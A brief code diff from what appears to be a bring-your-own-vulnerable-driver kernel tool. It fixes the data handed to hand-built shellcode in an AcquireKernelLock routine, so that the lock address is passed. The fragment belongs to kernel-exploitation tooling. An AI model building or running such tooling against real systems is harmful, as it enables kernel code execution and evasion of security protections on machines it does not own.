@@ -271,7 +271,7 @@ bool AcquireKernelLock(byovd::IByovdBackend* backend, uint64_t lockAddress, int 
     sc.push_back(0xC3);
 
     ContextBuilder buildCtx = [lockAddress, func](uint64_t base) {
-        uint64_t data[2] = { 0, func };
+        uint64_t data[2] = { lockAddress, func };
         return std::vector<uint8_t>(reinterpret_cast<uint8_t*>(data),
                                     reinterpret_cast<uint8_t*>(data) + sizeof(data));
     };
